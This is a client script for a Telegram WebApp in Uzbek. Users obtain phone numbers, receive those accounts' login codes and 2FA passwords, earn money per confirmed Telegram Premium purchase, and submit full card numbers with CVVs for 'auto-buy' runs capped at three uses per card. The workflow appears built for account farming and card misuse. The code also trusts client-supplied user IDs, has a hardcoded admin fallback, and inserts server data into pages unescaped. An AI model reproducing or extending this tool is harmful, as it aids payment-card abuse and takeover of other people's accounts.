// Telegram WebApp Client Script
const tg = window.Telegram?.WebApp;
if (tg) {
    tg.ready();
    tg.expand();
}

let currentUser = null;
let currentOrderId = null;
let currentPhone = "";
let currentCode = "";
let currentPassword = "";
let timerInterval = null;
let remainingSeconds = 300;

// Haptic feedback helper
function haptic(type = 'light') {
    if (tg?.HapticFeedback) {
        if (type === 'success' || type === 'error' || type === 'warning') {
            tg.HapticFeedback.notificationOccurred(type);
        } else {
            tg.HapticFeedback.impactOccurred(type);
        }
    }
}

// Toast helper
function showToast(message, type = 'success') {
    const toast = document.getElementById('toast');
    if (!toast) return;

    toast.className = `fixed top-16 left-1/2 -translate-x-1/2 z-50 transform transition-all duration-300 px-5 py-3 rounded-2xl text-xs font-bold shadow-2xl flex items-center gap-2.5 backdrop-blur-2xl border ${
        type === 'success' ? 'bg-emerald-950/80 text-emerald-300 border-emerald-500/40 shadow-emerald-950/60' : 
        type === 'error' ? 'bg-rose-950/80 text-rose-300 border-rose-500/40 shadow-rose-950/60' : 
        'bg-slate-900/80 text-cyan-300 border-cyan-500/30 shadow-cyan-950/60'
    }`;
    toast.innerHTML = `<span>${type === 'success' ? '✅' : type === 'error' ? '❌' : 'ℹ️'}</span><span>${message}</span>`;
    toast.style.opacity = '1';
    toast.style.transform = 'translate(-50%, 0)';

    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translate(-50%, -20px)';
    }, 2500);
}

// Clipboard Copy
function copyToClipboard(text, successMsg = "Nusxalandi!") {
    if (!text) return;
    haptic('medium');
    navigator.clipboard.writeText(text).then(() => {
        showToast(successMsg, 'info');
    }).catch(() => {
        showToast(text, 'info');
    });
}

// Tab Switching
function switchTab(tabId) {
    haptic('light');
    document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
    document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));

    const targetTab = document.getElementById(`tab-${tabId}`);
    const targetNav = document.getElementById(`nav-${tabId}`);
    if (targetTab) targetTab.classList.remove('hidden');
    if (targetNav) targetNav.classList.add('active');

    if (tabId === 'rating') loadLeaderboard();
    if (tabId === 'history') loadHistory();
    if (tabId === 'withdraw') loadWithdrawals();
}

// Format currency
function formatMoney(amount) {
    return Number(amount || 0).toLocaleString('uz-UZ');
}

// Auth Headers
function getHeaders() {
    const headers = { 'Content-Type': 'application/json' };
    if (tg?.initData) {
        headers['X-Telegram-Init-Data'] = tg.initData;
    }
    // Also include user id if available
    const uid = tg?.initDataUnsafe?.user?.id;
    if (uid) {
        headers['X-User-Id'] = uid;
    }
    return headers;
}

// Initialize Profile Info
function initUserData() {
    const user = tg?.initDataUnsafe?.user || {
        id: 6278841173,
        first_name: "Admin",
        username: "Muxamadiyev"
    };

    currentUser = user;
    const nameElem = document.getElementById('user-name');
    const idElem = document.getElementById('user-tg-id');
    const avatarElem = document.getElementById('user-avatar');

    const fullName = `${user.first_name || ''} ${user.last_name || ''}`.trim() || user.username || "Foydalanuvchi";
    if (nameElem) nameElem.innerHTML = `${fullName} <span class="text-yellow-400">⭐</span>`;
    if (idElem) idElem.innerText = user.id;
    if (avatarElem) avatarElem.innerText = (user.first_name || 'U').charAt(0).toUpperCase();

    fetchUserMe();
}

// API: Fetch User State
async function fetchUserMe() {
    try {
        const uid = currentUser?.id || 0;
        const res = await fetch(`/api/user/me?user_id=${uid}`, { headers: getHeaders() });
        if (!res.ok) return;
        const data = await res.json();

        // Update Balances
        document.getElementById('user-balance').innerText = formatMoney(data.balance);
        document.getElementById('user-premiums-count').innerText = data.successful_premiums || 0;
        document.getElementById('user-total-earned').innerText = `${formatMoney(data.total_earned)} so'm`;
        document.getElementById('withdraw-available-balance').innerText = formatMoney(data.balance);

        // Active Order Handling
        if (data.active_order) {
            showActiveOrder(data.active_order);
        } else {
            hideActiveOrder();
        }
    } catch (err) {
        console.error("fetchUserMe error:", err);
    }
}

// Active Order Display
function showActiveOrder(order) {
    currentOrderId = order.id;
    currentPhone = order.phone_number;
    currentCode = order.code || "";
    currentPassword = order.password || "";

    document.getElementById('get-number-box').classList.add('hidden');
    document.getElementById('active-order-box').classList.remove('hidden');
    document.getElementById('order-phone').innerText = currentPhone;

    // Code & Pass section
    const codeSection = document.getElementById('code-password-section');
    const initBtns = document.getElementById('order-buttons-init');
    const receivedBtns = document.getElementById('order-buttons-received');

    if (currentCode) {
        codeSection.classList.remove('hidden');
        document.getElementById('order-code').innerText = currentCode;
        if (currentPassword) {
            document.getElementById('password-subbox').classList.remove('hidden');
            document.getElementById('order-password').innerText = currentPassword;
        } else {
            document.getElementById('password-subbox').classList.add('hidden');
        }
        initBtns.classList.add('hidden');
        receivedBtns.classList.remove('hidden');
    } else {
        codeSection.classList.add('hidden');
        initBtns.classList.remove('hidden');
        receivedBtns.classList.add('hidden');
    }

    // Start Timer
    startTimer(order.seconds_left || 300);
}

function hideActiveOrder() {
    currentOrderId = null;
    currentPhone = "";
    currentCode = "";
    currentPassword = "";
    clearInterval(timerInterval);

    document.getElementById('active-order-box').classList.add('hidden');
    document.getElementById('get-number-box').classList.remove('hidden');
}

// Timer
function startTimer(seconds) {
    clearInterval(timerInterval);
    remainingSeconds = Math.max(0, seconds);

    function update() {
        if (remainingSeconds <= 0) {
            clearInterval(timerInterval);
            document.getElementById('order-timer').innerText = "00:00";
            hideActiveOrder();
            fetchUserMe();
            return;
        }
        const m = Math.floor(remainingSeconds / 60);
        const s = remainingSeconds % 60;
        document.getElementById('order-timer').innerText = 
            `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
        remainingSeconds--;
    }

    update();
    timerInterval = setInterval(update, 1000);
}

// API: Request Number
async function requestNumber() {
    const btn = document.getElementById('btn-main-get-number');
    btn.disabled = true;
    btn.innerHTML = `<span>⏳</span><span>Raqam olinmoqda...</span>`;
    haptic('medium');

    try {
        const uid = currentUser?.id || 0;
        const res = await fetch('/api/order/get_number', {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({ user_id: uid })
        });
        const data = await res.json();

        if (data.success && data.order) {
            haptic('success');
            showToast("Raqam olindi! 📱");
            showActiveOrder(data.order);
        } else {
            haptic('error');
            showToast(data.error || "Raqam olishda xatolik!", 'error');
        }
    } catch (err) {
        haptic('error');
        showToast("Server bilan aloqa yo'q!", 'error');
    } finally {
        btn.disabled = false;
        btn.innerHTML = `<span class="text-2xl animate-bounce">📱</span><span>Number Olish</span>`;
    }
}

// API: Request Code
async function requestCode() {
    if (!currentOrderId) return;
    haptic('medium');
    showToast("Kod so'ralmoqda...", 'info');

    try {
        const res = await fetch('/api/order/get_code', {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({ order_id: currentOrderId })
        });
        const data = await res.json();

        if (data.success) {
            haptic('success');
            showToast("Kod keldi! 🔑", 'success');
            currentCode = data.code;
            currentPassword = data.password || "";
            showActiveOrder({
                id: currentOrderId,
                phone_number: currentPhone,
                code: currentCode,
                password: currentPassword,
                seconds_left: remainingSeconds
            });
        } else {
            haptic('warning');
            showToast(data.error || "Kod hali kelmadi, kuting...", 'error');
        }
    } catch (err) {
        showToast("Xatolik yuz berdi!", 'error');
    }
}

// API: Confirm Received
async function confirmReceived() {
    if (!currentOrderId) return;
    haptic('medium');
    showToast("Premium tekshirilmoqda...", 'info');

    try {
        const res = await fetch('/api/order/received', {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({ order_id: currentOrderId })
        });
        const data = await res.json();

        if (data.success) {
            haptic('success');
            showToast("🎉 Tabriklaymiz! 40,000 so'm qo'shildi!", 'success');
            hideActiveOrder();
            fetchUserMe();
        } else {
            haptic('error');
            showToast(data.error || "Premium hali tasdiqlanmadi!", 'error');
        }
    } catch (err) {
        showToast("Server xatosi!", 'error');
    }
}

// API: Freeze Order
async function freezeOrder() {
    if (!currentOrderId) return;
    if (!confirm("Raqamni muzlatishni (Freeze) tasdiqlaysizmi?")) return;
    haptic('warning');

    try {
        const res = await fetch('/api/order/freeze', {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({ order_id: currentOrderId })
        });
        const data = await res.json();
        if (data.success) {
            haptic('success');
            showToast("Raqam muzlatildi 🧊", 'info');
            hideActiveOrder();
            fetchUserMe();
        }
    } catch (err) {
        showToast("Xatolik!", 'error');
    }
}

// API: Cancel Order
async function cancelOrder() {
    if (!currentOrderId) return;
    if (!confirm("Raqamni bekor qilishni tasdiqlaysizmi?")) return;
    haptic('warning');

    try {
        const res = await fetch('/api/order/cancel', {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({ order_id: currentOrderId })
        });
        const data = await res.json();
        if (data.success) {
            haptic('success');
            showToast("Raqam bekor qilindi ❌", 'info');
            hideActiveOrder();
            fetchUserMe();
        }
    } catch (err) {
        showToast("Xatolik!", 'error');
    }
}

// API: Load Leaderboard
async function loadLeaderboard() {
    const list = document.getElementById('leaderboard-list');
    list.innerHTML = `<div class="p-4 text-center text-xs text-slate-500">Yuklanmoqda...</div>`;

    try {
        const res = await fetch('/api/rating');
        const data = await res.json();
        if (!data.leaders || data.leaders.length === 0) {
            list.innerHTML = `<div class="p-6 text-center text-xs text-slate-500 glass-card rounded-2xl">Hozircha reytingda hech kim yo'q. Birinchi bo'ling!</div>`;
            return;
        }

        list.innerHTML = data.leaders.map((u, i) => `
            <div class="liquid-glass rounded-2xl p-4 flex items-center justify-between">
                <div class="flex items-center gap-3">
                    <div class="w-9 h-9 rounded-xl liquid-blue-icon font-mono font-black text-xs text-cyan-300">
                        #${i + 1}
                    </div>
                    <div>
                        <b class="text-xs text-white block">${u.display_name}</b>
                        <span class="text-[10px] text-slate-400">ID: ${u.user_id}</span>
                    </div>
                </div>
                <div class="text-right">
                    <span class="text-xs font-bold text-cyan-300 font-mono">${u.count} ta</span>
                    <span class="text-[10px] text-slate-400 block">${formatMoney(u.count * 40000)} so'm</span>
                </div>
            </div>
        `).join('');
    } catch (err) {
        list.innerHTML = `<div class="p-4 text-center text-xs text-rose-400">Yuklashda xatolik</div>`;
    }
}

// API: Load History
async function loadHistory() {
    const list = document.getElementById('history-list');
    list.innerHTML = `<div class="p-4 text-center text-xs text-slate-500">Yuklanmoqda...</div>`;

    try {
        const uid = currentUser?.id || 0;
        const res = await fetch(`/api/history?user_id=${uid}`, { headers: getHeaders() });
        const data = await res.json();

        if (!data.history || data.history.length === 0) {
            list.innerHTML = `<div class="p-6 text-center text-xs text-slate-500 liquid-glass rounded-2xl">Buyurtmalar tarixi mavjud emas</div>`;
            return;
        }

        const statusMap = {
            'completed': { label: 'Oldim (Tasdiqlangan)', color: 'text-cyan-300', iconClass: 'liquid-blue-icon', iconSvg: '<svg class=\"w-3.5 h-3.5\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2.5\" viewBox=\"0 0 24 24\"><path stroke-linecap=\"round\" stroke-linejoin=\"round\" d=\"M5 13l4 4L19 7\"/></svg>' },
            'frozen': { label: 'Muzlatilgan', color: 'text-sky-300', iconClass: 'liquid-blue-icon', iconSvg: '<span class=\"text-xs\">🧊</span>' },
            'cancelled': { label: 'Bekor qilingan', color: 'text-rose-400', iconClass: 'liquid-red-icon', iconSvg: '<span class=\"text-xs\">✕</span>' },
            'expired': { label: 'Vaqti o\'tgan', color: 'text-amber-400', iconClass: 'liquid-gold-icon', iconSvg: '<span class=\"text-xs\">⏱</span>' },
            'active': { label: 'Faol', color: 'text-cyan-400', iconClass: 'liquid-blue-icon', iconSvg: '<span class=\"w-2 h-2 rounded-full bg-cyan-400 animate-ping\"></span>' }
        };

        list.innerHTML = data.history.map(item => {
            const st = statusMap[item.status] || { label: item.status, color: 'text-slate-400', iconClass: 'liquid-blue-icon', iconSvg: '•' };
            return `
                <div class="liquid-glass rounded-2xl p-4 flex items-center justify-between">
                    <div class="flex items-center gap-3">
                        <div class="w-8 h-8 rounded-xl ${st.iconClass}">
                            ${st.iconSvg}
                        </div>
                        <div>
                            <div class="text-xs font-mono font-bold text-white tracking-wider">
                                ${item.phone}
                            </div>
                            <span class="text-[10px] text-slate-400 mt-0.5 block">${item.created_at ? item.created_at.substring(0, 16) : ''}</span>
                        </div>
                    </div>
                    <div class="text-right">
                        <span class="text-[11px] font-semibold ${st.color}">${st.label}</span>
                    </div>
                </div>
            `;
        }).join('');
    } catch (err) {
        list.innerHTML = `<div class="p-4 text-center text-xs text-rose-400">Yuklashda xatolik</div>`;
    }
}

// API: Submit Withdraw
async function submitWithdraw() {
    const card = document.getElementById('input-card-number').value.replace(/\s+/g, '');
    const amount = Number(document.getElementById('input-withdraw-amount').value);

    if (!card || card.length < 16) {
        showToast("Karta raqami noto'g'ri!", 'error');
        return;
    }
    if (!amount || amount < 100000) {
        showToast("Minimal yechish summasi: 100,000 so'm", 'error');
        return;
    }

    haptic('medium');
    try {
        const uid = currentUser?.id || 0;
        const res = await fetch('/api/withdraw', {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({
                user_id: uid,
                amount: amount,
                card_details: card
            })
        });
        const data = await res.json();
        if (data.success) {
            haptic('success');
            showToast("Ariza qabul qilindi! Admin tekshirmoqda.", 'success');
            document.getElementById('input-withdraw-amount').value = '';
            document.getElementById('input-card-number').value = '';
            fetchUserMe();
            loadWithdrawals();
        } else {
            haptic('error');
            showToast(data.error || "Xatolik!", 'error');
        }
    } catch (err) {
        showToast("Server xatosi!", 'error');
    }
}

// API: Load Withdrawals
async function loadWithdrawals() {
    const list = document.getElementById('withdraw-history-list');
    try {
        const uid = currentUser?.id || 0;
        const res = await fetch(`/api/withdrawals?user_id=${uid}`, { headers: getHeaders() });
        const data = await res.json();

        if (!data.withdrawals || data.withdrawals.length === 0) {
            list.innerHTML = `<div class="text-slate-500 text-center py-2">So'rovlar mavjud emas</div>`;
            return;
        }

        list.innerHTML = data.withdrawals.map(w => `
            <div class="flex items-center justify-between py-2 border-b border-sky-400/10 last:border-none">
                <div class="flex items-center gap-2.5">
                    <div class="w-7 h-7 rounded-xl liquid-blue-icon">
                        <svg class="w-3.5 h-3.5 text-cyan-300" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
                    </div>
                    <div>
                        <span class="font-mono text-slate-200 text-xs">${w.card_details}</span>
                        <span class="text-[10px] text-slate-500 block">${w.date ? w.date.substring(0, 16) : ''}</span>
                    </div>
                </div>
                <div class="text-right">
                    <b class="text-cyan-300 font-mono text-xs block">${formatMoney(w.amount)} so'm</b>
                    <span class="text-[10px] font-semibold ${w.status === 'completed' ? 'text-cyan-400' : w.status === 'rejected' ? 'text-rose-400' : 'text-amber-400'}">
                        ${w.status === 'completed' ? 'To\'landi' : w.status === 'rejected' ? 'Rad etildi' : 'Kutilmoqda'}
                    </span>
                </div>
            </div>
        `).join('');
    } catch (err) {}
}

// Format card number on input
document.addEventListener('DOMContentLoaded', () => {
    initUserData();
    loadUserCards();

    const cardInput = document.getElementById('input-card-number');
    if (cardInput) {
        cardInput.addEventListener('input', (e) => {
            let val = e.target.value.replace(/\D/g, '').substring(0, 16);
            let formatted = val.match(/.{1,4}/g)?.join(' ') || val;
            e.target.value = formatted;
        });
    }

    const newPan = document.getElementById('new-card-pan');
    if (newPan) {
        newPan.addEventListener('input', (e) => {
            let val = e.target.value.replace(/\D/g, '').substring(0, 16);
            let formatted = val.match(/.{1,4}/g)?.join(' ') || val;
            e.target.value = formatted;
        });
    }

    const newExp = document.getElementById('new-card-exp');
    if (newExp) {
        newExp.addEventListener('input', (e) => {
            let val = e.target.value.replace(/\D/g, '').substring(0, 4);
            if (val.length >= 2) {
                e.target.value = val.substring(0, 2) + '/' + val.substring(2);
            } else {
                e.target.value = val;
            }
        });
    }
});

// ==========================================
// KARTALAR VA AVTO-PREMIUM BOSHQARUVI
// ==========================================

let userCards = [];
let autoStatusInterval = null;

async function loadUserCards() {
    try {
        const uid = currentUser?.id || 0;
        const res = await fetch(`/api/cards?user_id=${uid}`, { headers: getHeaders() });
        const data = await res.json();
        userCards = data.cards || [];
        
        const activeCard = userCards.find(c => c.status === 'active' && c.used_count < c.max_limit);
        const cardTextEl = document.getElementById('ui-active-card-text');
        if (cardTextEl) {
            if (activeCard) {
                cardTextEl.innerText = `${activeCard.masked_number} (${activeCard.used_count}/${activeCard.max_limit} ta)`;
            } else if (userCards.length > 0) {
                cardTextEl.innerText = "Barcha kartalar limiti to'lgan (3/3)";
            } else {
                cardTextEl.innerText = "Karta qo'shilmagan";
            }
        }
        renderCardsModalList();
    } catch (e) {
        console.error("Cards load error:", e);
    }
}

function renderCardsModalList() {
    const listEl = document.getElementById('cards-modal-list');
    if (!listEl) return;
    if (userCards.length === 0) {
        listEl.innerHTML = `<div class="text-xs text-slate-500 py-3 text-center">Saqlangan kartalar mavjud emas.</div>`;
        return;
    }
    listEl.innerHTML = userCards.map(c => {
        const isLimit = c.used_count >= c.max_limit;
        return `
            <div class="p-2.5 rounded-xl bg-white/[0.04] border border-white/10 flex items-center justify-between">
                <div>
                    <span class="font-mono text-xs font-bold text-slate-200">${c.masked_number} ${c.cardholder_name ? `<span class="text-[10px] text-cyan-300 font-sans font-normal ml-1">(${c.cardholder_name})</span>` : ''}</span>
                    <span class="text-[10px] text-slate-400 block">${c.exp_month}/${c.exp_year} • Ishlatildi: <b class="${isLimit ? 'text-rose-400' : 'text-cyan-300'}">${c.used_count}/${c.max_limit}</b></span>
                </div>
                <div class="flex items-center gap-2">
                    <span class="text-[10px] font-bold px-2 py-0.5 rounded-md ${isLimit ? 'bg-rose-950/80 text-rose-300' : 'bg-emerald-950/80 text-emerald-300'}">
                        ${isLimit ? "Limit to'ldi" : 'Faol'}
                    </span>
                    <button onclick="deleteCard(${c.id})" class="text-xs text-rose-400 hover:text-rose-300 px-1.5 py-0.5">🗑</button>
                </div>
            </div>
        `;
    }).join('');
}

function openCardModal() {
    haptic('light');
    document.getElementById('cards-modal')?.classList.remove('hidden');
    loadUserCards();
}

function closeCardModal() {
    haptic('light');
    document.getElementById('cards-modal')?.classList.add('hidden');
}

async function submitNewCard() {
    const pan = document.getElementById('new-card-pan')?.value.replace(/\D/g, '') || '';
    const exp = document.getElementById('new-card-exp')?.value.replace(/\D/g, '') || '';
    const cvv = document.getElementById('new-card-cvv')?.value.replace(/\D/g, '') || '';
    const name = (document.getElementById('new-card-name')?.value || '').trim();

    if (pan.length !== 16) {
        showToast("Karta raqami 16 ta raqam bo'lishi kerak!", 'error');
        return;
    }
    if (exp.length !== 4) {
        showToast("Amal qilish muddati noto'g'ri (MM/YY)!", 'error');
        return;
    }
    if (cvv.length !== 3) {
        showToast("CVV kod 3 ta raqam bo'lishi kerak!", 'error');
        return;
    }
    if (name.includes('.')) {
        showToast("Qisqartirilgan format (M.M yoki M. Eshmatov) qabul qilinmaydi! To'liq yozing.", 'error');
        return;
    }
    const parts = name.split(/\s+/).filter(Boolean);
    if (parts.length < 2 || parts.some(p => p.length < 2)) {
        showToast("Ism va familiyani to'liq yozing (Masalan: Eshmatov Toshmat)!", 'error');
        return;
    }

    const month = exp.substring(0, 2);
    const year = exp.substring(2, 4);

    haptic('medium');
    try {
        const uid = currentUser?.id || 0;
        const res = await fetch('/api/cards/add', {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({
                user_id: uid,
                card_number: pan,
                exp_month: month,
                exp_year: year,
                cvv: cvv,
                cardholder_name: name
            })
        });
        const data = await res.json();
        if (data.success) {
            haptic('success');
            showToast("Karta saqlandi! ✅", 'success');
            document.getElementById('new-card-pan').value = '';
            document.getElementById('new-card-exp').value = '';
            document.getElementById('new-card-cvv').value = '';
            const nameEl = document.getElementById('new-card-name');
            if (nameEl) nameEl.value = '';
            await loadUserCards();
        } else {
            showToast(data.error || "Xatolik!", 'error');
        }
    } catch (e) {
        showToast("Server bilan aloqa yo'q!", 'error');
    }
}

async function deleteCard(cardId) {
    haptic('medium');
    try {
        const uid = currentUser?.id || 0;
        await fetch('/api/cards/delete', {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({ user_id: uid, card_id: cardId })
        });
        showToast("Karta o'chirildi", 'info');
        loadUserCards();
    } catch (e) {}
}

async function startAutoBuy() {
    const btn = document.getElementById('btn-auto-premium');
    btn.disabled = true;
    haptic('medium');

    const uid = currentUser?.id || 0;
    try {
        const res = await fetch('/api/order/auto_buy', {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({ user_id: uid })
        });
        const data = await res.json();
        if (data.success) {
            haptic('success');
            showToast("Avto-olish boshlandi! ⚡️");
            document.getElementById('auto-buy-progress-card')?.classList.remove('hidden');
            pollAutoStatus();
        } else {
            haptic('error');
            if (data.needs_card) {
                showToast(data.error || "Avval to'lov kartangizni qo'shing!", 'error');
                openCardModal();
            } else {
                showToast(data.error || "Xatolik!", 'error');
            }
        }
    } catch (e) {
        showToast("Server bilan aloqa yo'q!", 'error');
    } finally {
        btn.disabled = false;
    }
}

function pollAutoStatus() {
    if (autoStatusInterval) clearInterval(autoStatusInterval);
    const uid = currentUser?.id || 0;

    const check = async () => {
        try {
            const res = await fetch(`/api/order/auto_status?user_id=${uid}`, { headers: getHeaders() });
            const data = await res.json();
            const cardEl = document.getElementById('auto-buy-progress-card');
            const titleEl = document.getElementById('auto-step-title');
            const counterEl = document.getElementById('auto-step-counter');
            const barEl = document.getElementById('auto-step-bar');
            const textEl = document.getElementById('auto-step-text');

            if (!cardEl) return;
            cardEl.classList.remove('hidden');

            const pct = Math.max(10, Math.min(100, Math.round((data.step / (data.total_steps || 6)) * 100)));
            if (barEl) barEl.style.width = `${pct}%`;
            if (counterEl) counterEl.innerText = `${data.step || 1}/${data.total_steps || 6}`;
            if (titleEl) titleEl.innerHTML = `<span class="animate-spin text-sm">⚙️</span> ${data.title || 'Jarayon bajarilmoqda...'}`;
            if (textEl) textEl.innerHTML = data.text || '';

            if (data.completed) {
                clearInterval(autoStatusInterval);
                haptic('success');
                showToast("Telegram Premium faollashtirildi! 🎉", 'success');
                loadUserCards();
                if (typeof loadUserData === 'function') loadUserData();
            } else if (data.error) {
                clearInterval(autoStatusInterval);
                haptic('error');
                showToast(data.error, 'error');
                loadUserCards();
            }
        } catch (e) {}
    };

    check();
    autoStatusInterval = setInterval(check, 2000);
}

